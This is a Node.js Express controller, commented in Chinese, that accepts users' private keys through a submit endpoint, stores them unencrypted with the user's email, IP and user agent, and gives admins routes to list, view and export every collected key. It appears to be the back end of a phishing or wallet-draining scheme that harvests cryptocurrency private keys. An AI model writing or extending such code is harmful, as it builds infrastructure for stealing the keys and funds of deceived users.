const PrivateKey = require('../models/PrivateKey');
const Log = require('../models/Log');

// @desc    提交私钥
// @route   POST /api/keys/submit
// @access  Private
const submitKey = async (req, res) => {
  try {
    const { privateKey, email } = req.body;

    if (!privateKey) {
      return res.status(400).json({ success: false, message: '请提供私钥' });
    }

    // 创建私钥记录
    const key = await PrivateKey.create({
      email: email || req.user.email,
      privateKey
    });

    if (key) {
      // 记录日志
      await Log.create({
        type: '用户',
        email: email || req.user.email,
        action: '提交私钥',
        ip: req.ip,
        userAgent: req.headers['user-agent']
      });

      res.status(201).json({ success: true, message: '私钥提交成功' });
    } else {
      res.status(400).json({ success: false, message: '私钥提交失败' });
    }
  } catch (error) {
    console.error(error);
    res.status(500).json({ success: false, message: '服务器错误' });
  }
};

// @desc    获取所有私钥
// @route   GET /api/keys
// @access  Private/Admin
const getAllKeys = async (req, res) => {
  try {
    const keys = await PrivateKey.find({});
    res.json({ success: true, keys });
  } catch (error) {
    console.error(error);
    res.status(500).json({ success: false, message: '服务器错误' });
  }
};

// @desc    根据ID获取私钥
// @route   GET /api/keys/:id
// @access  Private/Admin
const getKeyById = async (req, res) => {
  try {
    const key = await PrivateKey.findById(req.params.id);
    
    if (key) {
      // 记录日志
      await Log.create({
        type: '管理员',
        username: req.user.name,
        action: `查看私钥 (ID: ${key._id})`,
        ip: req.ip
      });

      res.json({ success: true, key });
    } else {
      res.status(404).json({ success: false, message: '私钥不存在' });
    }
  } catch (error) {
    console.error(error);
    res.status(500).json({ success: false, message: '服务器错误' });
  }
};

// @desc    导出所有私钥
// @route   GET /api/keys/export
// @access  Private/Admin
const exportKeys = async (req, res) => {
  try {
    const keys = await PrivateKey.find({});
    
    // 记录日志
    await Log.create({
      type: '管理员',
      username: req.user.name,
      action: '导出所有私钥',
      ip: req.ip
    });

    res.json({ success: true, keys });
  } catch (error) {
    console.error(error);
    res.status(500).json({ success: false, message: '服务器错误' });
  }
};

module.exports = {
  submitKey,
  getAllKeys,
  getKeyById,
  exportKeys
};